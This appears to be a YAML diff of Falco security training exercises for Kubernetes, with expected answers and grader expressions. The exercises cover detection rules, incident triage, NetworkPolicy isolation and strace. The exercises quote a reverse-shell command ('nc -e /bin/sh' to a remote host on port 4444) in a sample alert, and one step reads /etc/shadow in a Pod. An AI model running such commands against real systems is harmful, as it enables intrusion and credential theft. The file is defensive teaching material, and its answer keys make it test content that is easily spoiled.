+  category: Writing Rules
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Write a rule named `Network tool in container` for `/etc/falco/rules.d/nettools.yaml`: it fires when
+      **`nc` or `nmap`** is started inside a container. Priority `CRITICAL`. The alert text must contain the
+      user, the command line, the container name, the Pod and the namespace.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Network tool in container
+          desc: nc or nmap was started inside a container
+          condition: spawned_process and container and proc.name in (nc, nmap)
+          output: Network tool started (user=%user.name command=%proc.cmdline container=%container.name pod=%k8s.pod.name ns=%k8s.ns.name)
+          priority: CRITICAL
+      header: Write the content of /etc/falco/rules.d/nettools.yaml.
+      hint: Reuse the pattern from the previous scenarios.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*(-\s+)?desc:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Network tool in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:CRITICAL)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?output:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?condition:\s*\S')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%user\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%proc\.cmdline\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%k8s\.pod\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%k8s\.ns\.name\b')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])spawned_process($|[\s)])|evt\.type\s*(=|==)\s*execve|evt\.type\s+in\s*\([^)]*execve')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])container($|[\s)])|container\.id\s*!=\s*host')) &&
+        (!answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])not\s+container($|[\s)])')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'[(,\s]nc[,)\s]|proc\.name\s*(=|==)\s*[\x27"]?nc[\x27"]?(\s|\)|$)')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'[(,\s]nmap[,)\s]|proc\.name\s*(=|==)\s*[\x27"]?nmap[\x27"]?(\s|\)|$)'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Match several binaries with `proc.name in (nc, nmap)` — shorter and safer than a chain of `or`s,
+        and it avoids precedence mistakes. If a binary may be invoked through different names (symlinks),
+        consider `proc.exepath` or the `basename()` transformer on it (`basename(proc.exepath)`) instead of `proc.name`.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/conditions/
+        text: Condition syntax
+- title: 'A Rule: An Outbound Connection'
+  category: Writing Rules
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Reverse shells often call back on port 4444. Write a rule named `Outbound connection to port 4444`
+      for `/etc/falco/rules.d/connect.yaml`:
+
+      - it fires when a process **inside a container connects to a remote TCP port 4444**
+      - priority `WARNING`
+      - the alert text must contain the user name, the process name, the connection (client and server
+        address and ports), the container name and the Pod name
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Outbound connection to port 4444
+          desc: A container opened a TCP connection to port 4444
+          condition: evt.type = connect and container and fd.l4proto = tcp and fd.sport = 4444
+          output: Outbound connection to port 4444 from container (user=%user.name process=%proc.name connection=%fd.name container=%container.name pod=%k8s.pod.name)
+          priority: WARNING
+      header: Write the content of /etc/falco/rules.d/connect.yaml.
+      hint: A new outgoing connection is a connect() call. Network fields distinguish the client (local) side from the server
+        (remote) side of a connection.
+      correctAnswerInfo: fd.sport is the server port and fd.cport the client port. For an outgoing connect, the remote side
+        is the server; fd.rport (remote port) is an equivalent choice.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*(-\s+)?desc:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Outbound connection to port 4444[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:WARNING)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?output:\s*\S')) &&
+        (answer.matches(r'(^|\n)\s*(-\s+)?condition:\s*\S')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%user\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%proc\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%fd\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%container\.name\b')) &&
+        (answer.split('output:')[1].split('desc:')[0].split('condition:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'%k8s\.pod\.name\b')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'evt\.type\s*(=|==)\s*connect|evt\.type\s+in\s*\([^)]*\bconnect\b')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])container($|[\s)])|container\.id\s*!=\s*host')) &&
+        (!answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'(^|[\s(])not\s+container($|[\s)])')) &&
+        (answer.split('condition:')[1].split('desc:')[0].split('output:')[0].split('priority:')[0].split('tags:')[0].split('enabled:')[0].split('override:')[0].matches(r'fd\.(sport|rport)\s*(=|==)\s*4444(\s|\)|$)|fd\.(sport|rport)\s+in\s*\(\s*4444\s*\)'))
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Network rules start with the `connect` event (outgoing) or `accept`/`accept4` (incoming) and then
+        filter on the connection fields:
+
+        | Field | Meaning |
+        |---|---|
+        | `fd.name` | the whole connection, `client_ip:port->server_ip:port` |
+        | `fd.sip`, `fd.sport` | server (destination) address and port |
+        | `fd.cip`, `fd.cport` | client (source) address and port |
+        | `fd.lport`, `fd.rport` | local and remote port |
+        | `fd.l4proto` | `tcp`, `udp`, ... |
+
+        Older material also adds `evt.dir = <` to look at the *exit* of the syscall. The concept of
+        direction is **deprecated since Falco 0.42**: leave it out of new rules, since it will be removed.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/conditions/
+        text: Condition syntax
+      - url: https://falco.org/docs/reference/rules/supported-fields/
+        text: Supported fields
+- title: Listing Rules and Fields by Hand
+  category: Running Falco by Hand
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      You are writing rules on `node01` and want to look things up without leaving the shell:
+      what rules exist, what one specific rule says, and which fields you can use.
+  - type: question
+    question:
+      questionType: command
+      header: Show the name and description of every loaded rule.
+      hint: One upper-case option describes all rules; its lower-case sibling takes a rule name.
+      command:
+        executable: falco
+        flags:
+        - name: describe-all
+          short: L
+          required: true
+          boolean: true
+  - type: question
+    question:
+      questionType: command
+      header: Show the description of the single rule 'Terminal shell in container'.
+      hint: The rule name contains spaces, so it has to be quoted to reach Falco as one argument.
+      command:
+        executable: falco
+        flags:
+        - name: describe-rule
+          short: l
+          required: true
+      cel: answer.contains('Terminal shell in container')
+  - type: question
+    question:
+      questionType: command
+      header: Print the list of all fields that can be used in conditions and outputs.
+      hint: The option has the name of the thing it lists.
+      command:
+        executable: falco
+        flags:
+        - name: list
+          required: true
+          boolean: true
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: proc.cmdline
+      header: Which field holds the full command line of a process?
+      cel: answer.trim() == 'proc.cmdline'
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: fd.directory
+      header: Which field holds the directory part of an opened file's path?
+      cel: answer.trim() == 'fd.directory'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Handy Falco command-line options (they print and exit):
+
+        | Option | Does |
+        |---|---|
+        | `-V <file>` / `--validate <file>` | validate rules files (repeatable) |
+        | `-L` | name and description of **all** rules |
+        | `-l "<rule>"` | description of one rule |
+        | `--list` / `--list=syscall` | all supported **fields** |
+        | `--list-events` | all supported syscall events |
+        | `-r <file>` | load this rules file (repeatable) instead of the configured list |
+        | `-M <seconds>` | stop after the given time |
+        | `-o key=value` | override a configuration value |
+
+        These work without starting the service, which makes them perfect for checking a rule before you
+        restart Falco. (The old `-D <rule>` option for disabling rules was removed; use the `rules:` section
+        or `-o "rules[].disable.rule=..."`.)
+    - type: references
+      links:
+      - url: https://falco.org/docs/reference/rules/supported-fields/
+        text: Supported fields
+      - url: https://falco.org/docs/concepts/rules/
+        text: Falco rules
+- title: Testing a Rule in the Foreground
+  category: Running Falco by Hand
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      `/root/shadow-rule.yaml` contains the rule `Read shadow in container`:
+  - type: manifest
+    header: /root/shadow-rule.yaml
+    content: |
+      - rule: Read shadow in container
+        desc: The shadow password file was read inside a container
+        condition: open_read and container and fd.name = /etc/shadow
+        output: Sensitive file read in container (user=%user.name process=%proc.name file=%fd.name container=%container.name pod=%k8s.pod.name)
+        priority: WARNING
+  - type: context
+    text: |
+      You want to try it **without touching the service**: run Falco in the foreground with the default
+      rules file and this file (the rule relies on macros that only the default file defines), and let it
+      stop by itself after 120 seconds.
+  - type: question
+    question:
+      questionType: command
+      header: Start Falco that way.
+      hint: With -r you replace the configured list of rules files for this run, so list everything you need, definitions
+        first. One more option limits the run time.
+      correctAnswerInfo: 'Without the default file, the rule would fail to load: open_read and container would be undefined.'
+      command:
+        executable: falco
+        flags:
+        - name: rules
+          short: r
+          required: true
+          regex: ^/(etc/falco/falco_rules\.yaml|root/shadow-rule\.yaml)$
+          repeatable: true
+        - name: duration
+          short: M
+          required: true
+          regex: ^120$
+      cel: answer.contains('/etc/falco/falco_rules.yaml') && answer.contains('/root/shadow-rule.yaml') && answer.indexOf('/etc/falco/falco_rules.yaml')
+        < answer.indexOf('/root/shadow-rule.yaml')
+  - type: manifest
+    header: (Falco output)
+    content: |
+      Tue Oct 20 11:41:09 2026: Falco version: 0.45.1 (x86_64)
+      Tue Oct 20 11:41:09 2026: Loading rules from:
+      Tue Oct 20 11:41:09 2026:    /etc/falco/falco_rules.yaml | schema validation: ok
+      Tue Oct 20 11:41:09 2026:    /root/shadow-rule.yaml | schema validation: ok
+  - type: context
+    text: |
+      In a second terminal you now **trigger** the rule from inside Pod `web-6c9d8f7b5-lm4tq` in the
+      namespace `shop`, by reading the shadow file with `cat`.
+  - type: question
+    question:
+      questionType: command
+      header: Run the command in the Pod that reads /etc/shadow.
+      hint: Anything after the double dash runs inside the container.
+      command:
+        executable: kubectl
+        strictness: permissive
+        subcommands:
+        - name: exec
+        positionals:
+        - index: 0
+          value: web-6c9d8f7b5-lm4tq
+        flags:
+        - name: namespace
+          short: n
+          required: true
+          value: shop
+        - name: container
+          short: c
+          regex: ^web$
+      cel: extras.join(' ').matches(r'^((ba)?sh -c )?cat /etc/shadow$')
+  - type: manifest
+    header: (Falco output)
+    content: |
+      11:42:30.552310976: Warning Sensitive file read in container (user=root process=cat file=/etc/shadow container=web pod=web-6c9d8f7b5-lm4tq)
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: cat
+      header: Which process name does the alert show?
+      cel: answer.trim() == 'cat'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        The **foreground test** is the fastest feedback loop for a new rule:
+
+        1. `falco -V default.yaml -V custom.yaml` to check syntax;
+        2. `falco -r default.yaml -r custom.yaml` to run it (add `-M <seconds>` to stop automatically);
+        3. trigger the behaviour from a Pod with `kubectl exec ... -- <command>`;
+        4. read the alert in the terminal.
+
+        A rule that validates but never fires is usually watching the wrong event type, direction or path,
+        or its scope excludes the Pod. Remember: **`-r` replaces the configured rules list**, so include
+        the default file whenever your rules use its macros, and list it first. Stop the real service
+        first if you want to avoid duplicate alerts from the same events.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/rules/
+        text: Falco rules
+      - url: https://falco.org/docs/setup/packages/
+        text: Install Falco from packages (systemd units)
+- title: From a Falco Alert to the Offending Pod
+  category: Investigating with Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      Falco on `node01` raised this alert. It names the **container ID** but not the Pod:
+  - type: manifest
+    header: journal
+    content: |
+      Oct 20 12:03:44 node01 falco[2210]: 12:03:44.771902345: Critical Reverse shell tool started (user=root command=nc -e /bin/sh 203.0.113.9 4444 container_id=7ac19e0b3d52 image=docker.io/library/busybox)
+  - type: question
+    question:
+      questionType: command
+      header: Find the container with that ID on this node, using the container runtime's CLI.
+      hint: crictl ps can filter containers; one of its filters takes the container ID.
+      command:
+        executable: crictl
+        subcommands:
+        - name: ps
+        flags:
+        - name: id
+          required: true
+          regex: ^7ac19e0b3d5[0-9a-f]*$
+        - name: all
+          short: a
+          boolean: true
+        - name: output
+          short: o
+          regex: ^(table|json|yaml)$
+  - type: manifest
+    header: $ crictl ps --id 7ac19e0b3d52
+    content: |
+      CONTAINER           IMAGE               CREATED             STATE               NAME                ATTEMPT             POD ID              POD                          NAMESPACE
+      7ac19e0b3d52a       a416a98b71e22       4 hours ago         Running             report-gen          0                   c41d9e7a2b6f3       report-gen-6d5f7c9b8-x4n2q   shop
+  - type: question
+    question:
+      questionType: command
+      header: 'Read how the Pod is owned: output its full definition (or just its owner references).'
+      hint: Owners are recorded in the Pod's metadata, which you only see with an output format that shows the full object.
+      command:
+        executable: kubectl
+        subcommands:
+        - name: get
+        positionals:
+        - index: 0
+          oneOf:
+          - pod
+          - pods
+          - po
+        - index: 1
+          value: report-gen-6d5f7c9b8-x4n2q
+        flags:
+        - name: namespace
+          short: n
+          required: true
+          value: shop
+        - name: output
+          short: o
+          required: true
+          regex: ^(yaml|json|jsonpath=.*ownerReferences.*)$
+  - type: manifest
+    header: $ kubectl get pod report-gen-6d5f7c9b8-x4n2q -n shop -o yaml  (excerpt)
+    content: |
+      ownerReferences:
+      - apiVersion: apps/v1
+        blockOwnerDeletion: true
+        controller: true
+        kind: ReplicaSet
+        name: report-gen-6d5f7c9b8
+        uid: 6b0f9a52-2d1e-4a43-9d0c-7a1e5c3b8f10
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: report-gen
+      header: The Pod is owned by a ReplicaSet, which in turn belongs to a Deployment named like the ReplicaSet without its
+        hash suffix. What is the Deployment's name?
+      hint: A ReplicaSet created by a Deployment is named <deployment>-<pod-template-hash>.
+      cel: answer.trim() == 'report-gen'
+  - type: question
+    question:
+      questionType: command
+      header: 'Stop the compromised workload without deleting anything: scale its Deployment down to zero replicas.'
+      hint: Deleting the Pod is pointless — its owner would create a new one immediately. Change the desired number of Pods
+        instead.
+      correctAnswerInfo: Scaling to zero keeps the Deployment object and its history for forensics while stopping every Pod.
+      command:
+        executable: kubectl
+        subcommands:
+        - name: scale
+        positionals:
+        - index: 0
+          regex: ^(deployment|deploy|deployments)(/report-gen)?$
+        - index: 1
+          required: false
+          value: report-gen
+        flags:
+        - name: replicas
+          required: true
+          value: '0'
+        - name: namespace
+          short: n
+          required: true
+          value: shop
+  - type: context
+    text: |
+      The incident ticket requires the offender to be recorded in the file `/root/offender.txt` as a
+      **single line** in exactly this format, with nothing else: `<namespace>/<pod-name>`.
+  - type: question
+    question:
+      questionType: command
+      header: Write the line to the file with one command.
+      hint: 'A graded format is graded character by character: separator, order and the absence of extra text all count.'
+      command:
+        executable: echo
+        strictness: permissive
+      cel: answer.matches(r'^echo\s+[\x27"]?shop/report-gen-6d5f7c9b8-x4n2q[\x27"]?\s*>\s*/root/offender\.txt$')
+  explanation:
+    elements:
+    - type: context
+      text: |
+        The standard **alert → Pod → owner → action** chain:
+
+        1. Falco gives a `container.id` (the first 12 characters of the container ID) — or directly
+           `k8s.pod.name`/`k8s.ns.name` if the rule's output includes them (add them with
+           `append_output`!).
+        2. `crictl ps --id <id>` (or `crictl inspect <id>`) maps the container to its Pod and namespace.
+        3. The Pod's `metadata.ownerReferences` leads to the ReplicaSet, and from there to the
+           Deployment. Never just delete the Pod: the controller recreates it.
+        4. Act as the task says: `kubectl scale deployment <name> --replicas=0`, a NetworkPolicy, or a
+           delete of the owning object.
+        5. Write down the findings in the requested format — exactly.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/
+        text: Falco concepts
+      - url: https://kubernetes.io/docs/tasks/debug/debug-cluster/crictl/
+        text: Debugging Kubernetes nodes with crictl
+- title: Which Pod Triggers the Most Alerts?
+  category: Investigating with Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      The rule `Shell in my containers` is noisy. Management asks **which Pod started the most shells**
+      in the last stretch of the journal. The rule's text output starts with `Shell started in container`.
+  - type: question
+    question:
+      questionType: command
+      header: Count the lines of the Falco unit's journal that contain that text, with one command line.
+      hint: 'Filter by the alert text, then count: either grep itself can count, or the filtered lines can be piped into a
+        line counter.'
+      correctAnswerInfo: 'In plain-text output the alert does not contain the rule name unless the rule''s output does — you
+        grep the message. With json_output: true you can grep for "rule":"<name>".'
+      command:
+        executable: journalctl
+        strictness: permissive
+        flags:
+        - name: unit
+          short: u
+          required: true
+          regex: ^falco(-modern-bpf)?(\.service)?$
+        - name: no-pager
+          boolean: true
+      cel: answer.matches(r'\|\s*grep\s+-c\s+[\x27"]Shell started in container[\x27"]\s*$') || answer.matches(r'\|\s*grep\s+[\x27"]Shell
+        started in container[\x27"]\s*\|\s*wc\s+-l\s*$')
+  - type: manifest
+    header: $ journalctl -u falco-modern-bpf --since "10 min ago"  (excerpt)
+    content: |
+      Oct 20 12:10:01 node01 falco[2210]: 12:10:01.1: Warning Shell started in container (user=root container=cart pod=cart-5d8f7b6c9-q2w8z ns=shop cmd=sh -c id)
+      Oct 20 12:10:09 node01 falco[2210]: 12:10:09.4: Warning Shell started in container (user=root container=search pod=search-7c9b4d6f5-h8k2m ns=shop cmd=sh)
+      Oct 20 12:11:15 node01 falco[2210]: 12:11:15.9: Warning Shell started in container (user=root container=cart pod=cart-5d8f7b6c9-q2w8z ns=shop cmd=sh -c ls /)
+      Oct 20 12:11:44 node01 falco[2210]: 12:11:44.2: Error File opened for writing below /etc (user=root file=/etc/hosts container=cart pod=cart-5d8f7b6c9-q2w8z)
+      Oct 20 12:12:02 node01 falco[2210]: 12:12:02.8: Warning Shell started in container (user=root container=cart pod=cart-5d8f7b6c9-q2w8z ns=shop cmd=sh -c cat /etc/passwd)
+      Oct 20 12:12:21 node01 falco[2210]: 12:12:21.0: Warning Shell started in container (user=app container=payment pod=payment-api-0 ns=shop cmd=bash)
+      Oct 20 12:12:57 node01 falco[2210]: 12:12:57.6: Warning Shell started in container (user=root container=cart pod=cart-5d8f7b6c9-q2w8z ns=shop cmd=sh -c env)
+      Oct 20 12:13:30 node01 falco[2210]: 12:13:30.3: Warning Shell started in container (user=root container=search pod=search-7c9b4d6f5-h8k2m ns=shop cmd=sh -c ps)
+      Oct 20 12:14:08 node01 falco[2210]: 12:14:08.5: Warning Shell started in container (user=root container=cart pod=cart-5d8f7b6c9-q2w8z ns=shop cmd=sh -c whoami)
+      Oct 20 12:14:52 node01 falco[2210]: 12:14:52.7: Warning Shell started in container (user=root container=search pod=search-7c9b4d6f5-h8k2m ns=shop cmd=sh -c uname)
+      Oct 20 12:15:19 node01 falco[2210]: 12:15:19.2: Warning Shell started in container (user=app container=payment pod=payment-api-0 ns=shop cmd=sh)
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: cart-5d8f7b6c9-q2w8z
+      header: Using the lines above, which Pod started the most shells? Answer with the Pod name.
+      hint: Count the shell alerts per Pod; ignore the alert that is about writing a file.
+      correctAnswerInfo: cart-… started 5 shells, search-… 3 and payment-api-0 2; the file-write line is a different rule.
+      cel: answer.trim() == 'cart-5d8f7b6c9-q2w8z'
+  - type: question
+    question:
+      questionType: command
+      header: Write the result to /root/top-pod.txt as <pod-name>,<number of shells> on a single line.
+      command:
+        executable: echo
+        strictness: permissive
+      cel: answer.matches(r'^echo\s+[\x27"]?cart-5d8f7b6c9-q2w8z,5[\x27"]?\s*>\s*/root/top-pod\.txt$')
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Counting and filtering is plain shell work on top of the journal:
+
+        ```
+        journalctl -u falco-modern-bpf | grep -c "Shell started in container"
+        journalctl -u falco-modern-bpf | grep "pod=" | grep -o "pod=[^ ]*" | sort | uniq -c | sort -rn
+        ```
+
+        (the second one ranks Pods by number of alerts). Two cautions: count **only the lines of the rule you
+        care about** — other rules mention the same Pod — and make sure the time window is what the task
+        asks for (`--since`). When the output must match a format, copy it exactly.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/outputs/channels/
+        text: Falco output channels
+- title: Containing the Pod's Network Access
+  category: Investigating with Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      The incident response plan for `report-gen` says: **keep the Pods running for forensics, but cut
+      their outbound network access**. The Pods carry the label `app=report-gen` and live in the
+      namespace `shop`. Their ingress must remain untouched.
+
+      Create a NetworkPolicy named `isolate-report-gen` for that.
+  - type: question
+    question:
+      questionType: manifest
+      manifestDefinitionId: networkpolicy-v1
+      header: Write the NetworkPolicy manifest.
+      hint: A policy that selects Pods for a direction and then allows nothing for that direction blocks it.
+      correctAnswerInfo: Listing Egress in policyTypes without any egress rule means 'deny all egress' for the selected Pods.
+        Ingress is unaffected because it is not listed.
+      cel: '!has(manifest.spec.egress) || manifest.spec.egress.size() == 0'
+      expectedFields:
+      - path: metadata.name
+        expectedValue: isolate-report-gen
+      - path: metadata.namespace
+        expectedValue: shop
+      - path: spec.podSelector.matchLabels.app
+        expectedValue: report-gen
+      - path: spec.policyTypes
+        expectedValue:
+        - Egress
+  explanation:
+    elements:
+    - type: context
+      text: |
+        A NetworkPolicy selects Pods (`podSelector`) and **isolates them for the directions in
+        `policyTypes`**; only what the `ingress`/`egress` rules allow remains. Therefore:
+
+        - `policyTypes: [Egress]` with no `egress:` = **no outbound traffic** (including DNS);
+        - an empty `podSelector: {}` would select every Pod in the namespace — much broader than
+          intended;
+        - `egress: [{}]` (one empty rule) would allow **everything**, the opposite of containment.
+
+        NetworkPolicies need a CNI plugin that enforces them. Scaling to zero is the more drastic
+        alternative when no forensics are needed.
+    - type: references
+      links:
+      - url: https://kubernetes.io/docs/concepts/services-networking/network-policies/
+        text: Network Policies
+- title: Looking at the Process Directly (strace)
+  category: Investigating with Falco
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      A Falco alert mentions a suspicious process with PID `21345` on `node01`, but the alert does not
+      say where it connects. As a secondary tool — Falco is the primary one — you can attach to a running
+      process with `strace`. Trace PID 21345 **and the processes it creates**, showing **only its network-related
+      system calls**.
+  - type: question
+    question:
+      questionType: command
+      header: Attach strace as described.
+      hint: One option selects the process to attach to, another follows children, and the -e expression selects a class of
+        system calls by name.
+      command:
+        executable: strace
+        flags:
+        - name: attach
+          short: p
+          required: true
+          regex: ^21345$
+        - name: follow-forks
+          short: f
+          required: true
+          boolean: true
+        - name: trace
+          short: e
+          required: true
+          regex: ^trace=(network|%network|connect(,\w+)*)$
+  - type: manifest
+    header: $ strace -p 21345 -f -e trace=network
+    content: |
+      [pid 21345] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+      [pid 21345] connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("203.0.113.9")}, 16) = 0
+      [pid 21346] sendto(3, "uid=0(root) gid=0(root)\n", 24, 0, NULL, 0) = 24
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: 203.0.113.9:4444
+      header: Where does the process connect? Answer as ip:port.
+      hint: 'Look at the connect() call: the address and the port are in the sockaddr structure.'
+      cel: answer.replace(' ', '').matches(r'^203\.0\.113\.9[:]4444$')
+  explanation:
+    elements:
+    - type: context
+      text: |
+        Other tools sometimes recommended for runtime investigation:
+
+        | Tool | Strength |
+        |---|---|
+        | `strace -p <pid> -f -e trace=<class>` | per-process system calls (slows the process; classes: `network`, `file`, `process`, ...) |
+        | `sysdig` | system-wide event capture with a filter syntax almost identical to Falco's (`sysdig proc.pid=21345 and evt.type=connect`) |
+        | `crictl inspect <id>` | find the host PID of a container (`info.pid`) |
+
+        In a Falco-centred exam task, strace/sysdig are usually only a *means to confirm* what a rule
+        reported. Use them sparingly on production nodes: they add noticeable overhead.
+    - type: references
+      links:
+      - url: https://falco.org/docs/concepts/
+        text: Falco concepts
+- title: 'Capstone: Retune a Default Rule and Prove It'
+  category: Capstone
+  hintsEnabled: true
+  elements:
+  - type: context
+    text: |
+      **Task** (ticket SEC-602). On `node01`, change the default rule `Terminal shell in container` so
+      that:
+
+      - its priority is `ERROR`;
+      - its alert text is exactly the event time, the numeric user id and the process name, in this order,
+        separated by commas without spaces (Falco adds its usual prefix);
+      - the change is made in the local rules file and survives upgrades.
+
+      Then validate, restart, trigger the rule from Pod `web-6c9d8f7b5-lm4tq` in the namespace `shop`
+      and read the result from the journal.
+  - type: question
+    question:
+      questionType: multiline
+      expectedAnswer: |
+        - rule: Terminal shell in container
+          priority: ERROR
+          output: "%evt.time,%user.uid,%proc.name"
+          override:
+            priority: replace
+            output: replace
+      header: 1. Write /etc/falco/falco_rules.local.yaml.
+      cel: |-
+        (answer.matches(r'(^|\n)\s*-\s*rule:\s*[\x27"]?Terminal shell in container[\x27"]?\s*($|\n)')) &&
+        (answer.matches(r'(^|\n)\s*priority:\s*[\x27"]?(?i:ERROR)[\x27"]?\s*($|\n|#)')) &&
+        (answer.matches(r'(^|\n)\s*output:\s*[\x27"]?%evt\.time,%user\.uid,%proc\.name[\x27"]?\s*($|\n)')) &&
+        (answer.split('override:')[1].matches(r'priority:\s*replace')) &&
+        (answer.split('override:')[1].matches(r'output:\s*replace'))
+  - type: question
+    question:
+      questionType: command
+      header: 2. Validate the default rules file together with the local file.
+      command:
+        executable: falco
+        flags:
+        - name: validate
+          short: V
+          required: true
+          regex: ^/etc/falco/(falco_rules\.yaml|falco_rules\.local\.yaml)$
+          repeatable: true
+      cel: answer.contains('falco_rules.yaml') && answer.contains('falco_rules.local.yaml') && answer.indexOf('/etc/falco/falco_rules.yaml')
+        < answer.indexOf('/etc/falco/falco_rules.local.yaml')
+  - type: question
+    question:
+      questionType: command
+      header: 3. Restart the Falco service.
+      command:
+        executable: systemctl
+        subcommands:
+        - name: restart
+        positionals:
+        - index: 0
+          regex: ^falco(-modern-bpf)?(\.service)?$
+  - type: question
+    question:
+      questionType: command
+      header: '4. Trigger the rule: open an interactive shell in the Pod (the rule only fires for a terminal).'
+      hint: The rule includes a condition on a terminal being attached to the process; kubectl needs two options for that.
+      command:
+        executable: kubectl
+        strictness: permissive
+        subcommands:
+        - name: exec
+        positionals:
+        - index: 0
+          value: web-6c9d8f7b5-lm4tq
+        flags:
+        - name: namespace
+          short: n
+          required: true
+          value: shop
+        - name: stdin
+          short: i
+          required: true
+          boolean: true
+        - name: tty
+          short: t
+          required: true
+          boolean: true
+      cel: extras.size() == 1 && extras[0] in ['sh', 'bash', '/bin/sh', '/bin/bash']
+  - type: question
+    question:
+      questionType: command
+      header: 5. Show what the Falco unit logged during the last minute.
+      command:
+        executable: journalctl
+        flags:
+        - name: unit
+          short: u
+          required: true
+          regex: ^falco(-modern-bpf)?(\.service)?$
+        - name: since
+          required: true
+          regex: ^(1 min(ute)?s? ago|-1 ?m(in(ute)?s?)?)$
+        - name: no-pager
+          boolean: true
+  - type: manifest
+    header: $ journalctl -u falco-modern-bpf --since "1 minute ago"
+    content: |
+      Oct 20 12:31:07 node01 falco[2210]: 12:31:07.123456789: Error 12:31:07.123456789,0,sh
+  - type: question
+    question:
+      questionType: single-line
+      expectedAnswer: Error
+      header: 6. Which priority does the alert carry?
+      cel: answer.lowerAscii().trim() == 'error'
+  explanation:
+    elements:
+    - type: context
+      text: |
+        The sequence you should be able to run without looking anything up:
+
+        1. **edit** the local rules file (override with `replace` for the keys you change);
+        2. **validate** with `falco -V <default> -V <local>`;
+        3. **restart** the unit, then read `journalctl -u <unit>` for load errors;
+        4. **trigger** the behaviour (`kubectl exec -it ... -- sh`);
+        5. **read** the alert and compare it with the requirement character by character.
+
+        Typical reasons the alert does not look as expected: the rule is not loaded (typo or wrong
+        file), another file loaded later overrides it, the minimum `priority:` in `falco.yaml` filters it
+        out, or the service was not restarted.
